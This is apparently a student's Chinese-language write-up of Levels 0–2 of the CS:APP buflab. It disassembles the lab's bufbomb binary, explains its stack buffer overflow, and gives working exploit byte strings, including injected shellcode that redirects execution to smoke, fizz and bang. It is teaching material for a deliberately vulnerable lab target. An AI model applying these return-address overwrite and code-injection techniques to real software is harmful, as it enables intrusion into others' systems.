## buflab 实验

本实验材料通过官方网站下载：https://csapp.cs.cmu.edu/2e/labs.html

以下是我的解题过程

### Level 0: Candle (10 pts)

这一步的要求很简单，根据 `buflab.pdf` 有如下 test 函数：

```c
void test()
{
  int val;
  /* Put canary on stack to detect possible corruption */
  volatile int local = uniqueval();

  val = getbuf();

  /* Check for corrupted stack */
  if (local != uniqueval()) {
    printf("Sabotaged!: the stack has been corrupted\n");
  }
  else if (val == cookie) {
    printf("Boom!: getbuf returned 0x%x\n", val);
    validate(3);
  } else {
    printf("Dud: getbuf returned 0x%x\n", val);
  }
}
```

当 test 函数的 `getbuf` 调用返回时，通常情况下会继续执行 `val = getbuf();` 后面的语句，这一步的要求是通过输入特定的字符串来改变这个行为，使得 `getbuf` 返回时跳转到 `smoke` 函数执行。

```c
void smoke()
{
  printf("Smoke!: You called smoke()\n");
  validate(0);
  exit(0);
}
```

通过命令 `objdump -d` 反汇编 `bufbomb` 确定 `getbuf` 函数的实现：

```x86asm
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret   
```

`getbuf` 通过 `Gets` 获取用户输入，将用户输入的字符串当在栈上，如果一切正常直接返回 1 给 `getbuf` 的调用方，忽略用户输入。

为了直观展示，这里给出调用 `Gets` 前的调用栈情况：

![](images/02_24_level_0_stack.svg)

**图 1：调用 Gets 前的 getbuf 的栈帧情况**

可以看到传给 `Gets` 的 buf 大小为 40 个字节，接下来是 4 个字节的 %ebp 寄存器原始值，4 个字节的 `getbuf` 返回值，为了达到 `getbuf` 返回时跳转到 `smoke` 函数的目的，只需要构造一个特定的字符串，将 `getbuf` 的返回值修改为 `smoke` 函数所在地址即可。

同样通过反汇编可知道 `smoke` 的地址：

```x86asm
08048c18 <smoke>:
 8048c18:	55                   	push   %ebp
 8048c19:	89 e5                	mov    %esp,%ebp
 8048c1b:	83 ec 18             	sub    $0x18,%esp
 8048c1e:	c7 04 24 d3 a4 04 08 	movl   $0x804a4d3,(%esp)
 8048c25:	e8 96 fc ff ff       	call   80488c0 <puts@plt>
 8048c2a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c31:	e8 45 07 00 00       	call   804937b <validate>
 8048c36:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c3d:	e8 be fc ff ff       	call   8048900 <exit@plt>
```

一个合法的输入序列为：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

假设上述的输入序列已经保存在文件 `0_smoke_hex.txt` 可使用如下命令，验证：

```bash
$ ./hex2raw < 0_smoke_hex.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

### Level 1: Sparkler (10 pts)

这一步要求是 `getbuf` 返回时调用 `fizz` 函数，并将入参 `val` 设置为 `cookie`：

```c
void fizz(int val)
{
  if (val == cookie) {
    printf("Fizz!: You called fizz(0x%x)\n", val);
    validate(1);
  } else
    printf("Misfire: You called fizz(0x%x)\n", val);
  exit(0);
}
```

由于，我们不是真正通过 `call` 指令调用 `fizz` 函数的，因此需要在跳转到 `fizz` 函数前构造好调用栈，以下是 `Gets` 返回后 `getbuf` 的栈帧示意值：

![](images/02_24_level_1_stack.svg)

**图 2：调用 Gets 后的 getbuf 的栈帧情况**

通过反汇编可知 `fizz` 函数所在地址：

```x86asm
08048c42 <fizz>:
```

以 

```
Userid: bovik
Cookie: 0x1005b2b7
```

为例，我们需要构造如下输入：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08  00 00 00 00 b7 b2 05 10
```

假设上述的输入序列已经保存在文件 `1_fizz_hex.txt` 可使用如下命令，验证：

```bash
$ ./hex2raw < 1_fizz_hex.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Fizz!: You called fizz(0x1005b2b7)
VALID
NICE JOB!
```

### Level 2: Firecracker (15 pts)

这一步的要求是 `getbuf` 返回的时候调用如下函数：

```c
int global_value = 0;

void bang(int val)
{
  if (global_value == cookie) {
    printf("Bang!: You set global_value to 0x%x\n", global_value);
    validate(2);
  } else
    printf("Misfire: global_value = 0x%x\n", global_value);
  exit(0);
}
```

但在修改前需要先将 `global_value` 全局变量修改为和 `cookie` 相同的值。

思路是在 `getbuf` 返回时跳转到用户输入的 buf 地址，在这里填充特定的字节序列，实现修改 `global_value` 为 `cookie` 以及跳转到 `bang` 函数的功能。

通过反汇编可以知道 `global_value` 的地址为 `0x804d100`，`bang` 函数的地址为：`0x08048c9d`, 代码如下：

```
08048c9d <bang>:
 8048c9d:	55                   	push   %ebp
 8048c9e:	89 e5                	mov    %esp,%ebp
 8048ca0:	83 ec 18             	sub    $0x18,%esp
 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax
 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
 8048cae:	75 26                	jne    8048cd6 <bang+0x39>
 ...
```

下一步需要找到 buf 缓冲区的地址，通过前面 Level 的分析可知 buf 是在栈上的，通过 GDB 单步执行完下面的 `lea` 指令这一步，然后查看 `%eax` 寄存器的值可知 buf 的地址为 `0x55683588`。

```x86asm
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret   
```

我们在执行 `bang` 前要执行的代码如下，其中立即数 `0x1005b2b7` 是我们的 `cookie` 值：

```x86asm
movl $0x804d100, %eax
movl $0x1005b2b7, (%eax)
ret
```

可以使用如下命令将上述汇编代码转成机器码：

```bash
unix> gcc -m32 -c example.S
unix> objdump -d example.o > example.d
```

我们要输入的字符串如下：

```
b8 00 d1 04 08 c7 00 b7 b2 05 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 35 68 55 9d 8c 04 08
```

`getbuf` 在执行 `Gets` 后的栈应该如下图所示：

![](images/02_24_level_1_stack.svg)

**图 3：调用 Gets 后的 getbuf 的栈帧情况**

假设上述的输入序列已经保存在文件 `2_bang_hex.txt` 可使用如下命令，验证：

```bash
$ ./hex2raw < 2_bang_hex.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Bang!: You set global_value to 0x1005b2b7
VALID
NICE JOB!
```

https://jtchen.io/blog/csapp-bufferlab